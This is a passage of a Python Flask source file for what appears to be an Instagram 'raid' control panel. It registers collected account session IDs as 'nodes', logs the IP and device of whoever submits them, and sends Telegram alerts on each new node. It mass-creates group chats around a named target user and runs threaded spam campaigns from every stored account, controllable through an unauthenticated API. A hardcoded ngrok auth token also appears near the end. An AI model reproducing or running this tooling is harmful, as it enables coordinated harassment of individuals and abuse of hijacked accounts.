</html>
"""

# ================= ROUTES =================
@app.route("/", methods=["GET", "POST"])
def index():
    if "operator_name" not in session:
        if request.method == "POST":
            op_name = request.form.get("operator_name", "").strip()
            if op_name:
                session["operator_name"] = op_name
                return redirect(url_for("index"))
        return render_template_string(SETUP_HTML)

    message = None
    conn = sqlite3.connect('panel_users.db')
    cursor = conn.cursor()

    if request.method == "POST":
        action_type = request.form.get("action_type")

        if action_type == "add_session":
            new_sid = request.form.get("new_session_id", "").strip()
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            user_device = request.headers.get('User-Agent', 'Unknown Device')
            added_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            try:
                cl = login_with_session(new_sid, "temp_user")
                acc_info = cl.account_info()
                username = acc_info.username
                full_name = acc_info.full_name or "N/A"
                
                try:
                    user_id = cl.user_id_from_username(username)
                    user_details = cl.user_info(user_id)
                    followers = user_details.follower_count
                    following = user_details.following_count
                except:
                    followers = 0
                    following = 0

                cursor.execute("""
                    INSERT OR REPLACE INTO sessions (username, full_name, followers, following, session_id, ip_address, device, added_at) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """, (username, full_name, followers, following, new_sid, client_ip, user_device, added_time))
                conn.commit()

                send_telegram_alert(f"🚨 *SNAPPY BAAP: NEW NODE REGISTERED* 🚨\nUser: @{username} | Name: `{full_name}`")
                message = f"Node @{username} registered successfully!"
                log_event(f"Registered @{username} | Followers: {followers}", "success")
            except Exception as e:
                message = f"Registration failed: {e}"
                log_event(f"Registration error: {str(e)[:50]}", "error")

        elif action_type == "update_live_target":
            new_tgt = request.form.get("new_target_name", "").strip()
            if new_tgt:
                cursor.execute("SELECT username FROM sessions")
                for row in cursor.fetchall():
                    uname = row[0]
                    dynamic_targets[uname] = new_tgt
                message = f"Live target switched instantly to: '{new_tgt}' across all active nodes!"
                log_event(f"Live target dynamically switched to: {new_tgt}", "success")
            else:
                message = "Error: Target name cannot be empty!"

        elif action_type == "upload_automa_json":
            file = request.files.get("automa_file")
            if file and file.filename.endswith('.json'):
                try:
                    file_content = file.read().decode('utf-8')
                    parsed_json = json.loads(file_content)
                    with open("uploaded_automa_workflow.json", "w", encoding="utf-8") as f:
                        f.write(json.dumps(parsed_json, indent=4))
                    message = f"Automa JSON file '{file.filename}' uploaded and parsed successfully!"
                    log_event(f"Automa workflow uploaded: {file.filename}", "success")
                except Exception as e:
                    message = f"Invalid JSON file format: {e}"
            else:
                message = "Please upload a valid .json automation file."

        elif action_type == "start_nc_lock":
            lock_gc_input = request.form.get("lock_gc_input", "").strip()
            locked_name = request.form.get("locked_name", "").strip()

            cursor.execute("SELECT username, session_id FROM sessions LIMIT 1")
            row = cursor.fetchone()
            if row and lock_gc_input and locked_name:
                uname, sid = row
                module_key = f"nclock_{uname}"
                lock_name_threads[module_key] = True

                t = threading.Thread(
                    target=run_name_lock_worker,
                    args=(sid, lock_gc_input, locked_name, module_key, uname)
                )
                t.daemon = True
                t.start()
                message = f"NC Lock enabled successfully!"
            else:
                message = "Error: Register node and fill all fields!"

        elif action_type == "stop_nc_lock":
            cursor.execute("SELECT username FROM sessions")
            for acc in cursor.fetchall():
                lock_name_threads[f"nclock_{acc[0]}"] = False
            message = "NC Lock disabled."
            log_event("NC Lock stopped by operator.", "warning")

        elif action_type == "mass_create_gc":
            gc_prefix = request.form.get("gc_prefix", "Raid").strip()
            target_user = request.form.get("target_user", "").strip()
            try:
                gc_count = int(request.form.get("gc_count", 1))
            except:
                gc_count = 1

            cursor.execute("SELECT session_id, username FROM sessions LIMIT 1")
            row = cursor.fetchone()
            if row:
                try:
                    cl = login_with_session(row[0], "temp_user")
                    target_user_id = cl.user_id_from_username(target_user)
                    
                    created_count = 0
                    for i in range(1, gc_count + 1):
                        title = f"{gc_prefix} {i}"
                        try:
                            cl.direct_create_group([target_user_id], title=title)
                            created_count += 1
                            log_event(f"Created Group: {title}", "success")
                            time.sleep(0.4)
                        except Exception as ex:
                            log_event(f"Group item {title} skipped", "warning")

                    message = f"Sequential deployment complete: {created_count} GCs created!"
                except Exception as e:
                    message = f"Mass GC Engine Error: {e}"
            else:
                message = "Error: Register at least one node first!"

        elif action_type == "start_spam":
            target_name = request.form.get("target_name")
            target_scope = request.form.get("target_scope")
            single_gc_input = request.form.get("single_gc_input", "").strip()
            spam_option = request.form.get("spam_option")
            custom_text = request.form.get("custom_text", "").strip()
            selected_nodes = request.form.getlist("selected_nodes")
            
            try:
                custom_delay = float(request.form.get("custom_delay", 3.5))
            except:
                custom_delay = 3.5

            if not selected_nodes:
                message = "Error: Please select at least one node to deploy!"
            else:
                selected_list = SIREN_LIST_1
                if spam_option == "opt2": selected_list = SIREN_LIST_2
                elif spam_option == "opt3": selected_list = SIREN_LIST_3
                elif spam_option == "opt4": selected_list = SIREN_LIST_4
                elif spam_option == "opt_custom": 
                    selected_list = [line.strip() for line in custom_text.split('\n') if line.strip()] if custom_text else SIREN_LIST_1

                for uname in selected_nodes:
                    cursor.execute("SELECT session_id FROM sessions WHERE username = ?", (uname,))
                    row = cursor.fetchone()
                    if row:
                        sid = row[0]
                        module_key = f"spam_{uname}"
                        active_spam_threads[module_key] = True

                        t = threading.Thread(
                            target=run_spam_worker,
                            args=(sid, target_name, None, selected_list, target_scope, single_gc_input, custom_delay, module_key, uname)
                        )
                        t.daemon = True
                        t.start()
                        log_event(f"Node @{uname} deployed on target '{target_name}'", "info")

                message = f"Routed campaign active for target '{target_name}'."

        elif action_type == "stop_spam":
            cursor.execute("SELECT username FROM sessions")
            for acc in cursor.fetchall():
                active_spam_threads[f"spam_{acc[0]}"] = False
            message = "All active threads halted."
            log_event("Emergency stop executed.", "warning")

        elif action_type == "get_links":
            try:
                return send_file("link.txt", as_attachment=True)
            except Exception as e:
                message = "link.txt not found!"

    cursor.execute("SELECT id, username FROM sessions")
    all_nodes = cursor.fetchall()
    conn.close()

    uptime_seconds = int(time.time() - app_start_time)
    return render_template_string(DASHBOARD_HTML, active_tab="dashboard", message=message, uptime_seconds=uptime_seconds, all_nodes=all_nodes)

@app.route("/api/json_action", methods=["POST"])
def json_action():
    try:
        data = request.get_json(force=True)
        action = data.get("action")
        target_name = data.get("target", "JSON_RAID")
        custom_delay = float(data.get("delay", 3.5))

        conn = sqlite3.connect('panel_users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT username, session_id FROM sessions")
        all_accounts = cursor.fetchall()
        conn.close()

        if action == "start":
            if not all_accounts:
                return jsonify({"status": "error", "message": "No nodes registered"})
            
            for acc in all_accounts:
                uname, sid = acc
                module_key = f"spam_{uname}"
                active_spam_threads[module_key] = True
                t = threading.Thread(
                    target=run_spam_worker,
                    args=(sid, target_name, None, SIREN_LIST_1, "all", "", custom_delay, module_key, uname)
                )
                t.daemon = True
                t.start()
            
            log_event(f"JSON API triggered campaign: {target_name}", "success")
            return jsonify({"status": "success", "message": f"Started for {target_name}"})
        
        elif action == "stop":
            for acc in all_accounts:
                active_spam_threads[f"spam_{acc[0]}"] = False
            log_event("JSON API stopped all threads.", "warning")
            return jsonify({"status": "success", "message": "Stopped"})

        return jsonify({"status": "error", "message": "Invalid action"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route("/ids_status")
def ids_status():
    if "operator_name" not in session:
        return redirect(url_for("index"))

    conn = sqlite3.connect('panel_users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, full_name, followers, following, ip_address FROM sessions")
    accounts = cursor.fetchall()
    conn.close()

    card_data = []
    for acc in accounts:
        acc_id, uname, fname, followers, following, ip = acc
        st = account_stats.get(uname, {"sent": 0, "failed": 0, "gcs_count": 0, "target": "No Active Target"})
        t_name = campaign_info.get(uname, {}).get("target", "CAMPAIGN")
        card_data.append({
            "id": acc_id,
            "username": uname,
            "full_name": fname,
            "followers": followers,
            "following": following,
            "ip": ip,
            "sent": st["sent"],
            "failed": st["failed"],
            "gcs_count": st["gcs_count"],
            "target_name": t_name
        })

    uptime_seconds = int(time.time() - app_start_time)
    return render_template_string(IDS_STATUS_HTML, active_tab="ids", accounts=accounts, card_data=card_data, uptime_seconds=uptime_seconds)

@app.route("/get_logs")
def get_logs():
    return jsonify({"logs": live_logs})

@app.route("/remove_session/<int:id>")
def remove_session(id):
    conn = sqlite3.connect('panel_users.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sessions WHERE id = ?", (id,))
    conn.commit()
    conn.close()
    return redirect(url_for("ids_status"))

@app.template_global()
def render_template_string(source, **context):
    from flask import render_template_string as rts
    full_source = source
    if "{% extends" in full_source:
        full_source = full_source.replace('{% extends "layout" %}', '').replace("{% extends 'layout' %}", '')
        block_content = full_source.split("{% block content %}")[1].split("{% endblock %}")[0]
        full_source = LAYOUT_TEMPLATE.replace("{% block content %}{% endblock %}", block_content)
    return rts(full_source, **context)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    
    try:
        ngrok.set_auth_token("3I9s1ivPTyVes5lY6VGZEJYmjoA_HGAmAnRZdUqSkbSCyath")
        public_url = ngrok.connect(port).public_url
        print(f"\n * 🌐 Ngrok Public URL: {public_url} *\n")
        log_event(f"Ngrok Tunnel Active: {public_url}", "success")
    except Exception as e:
        print(f"\n * ⚠️ Ngrok tunnel failed: {e} *\n")

    app.run(host="0.0.0.0", port=port, debug=False)
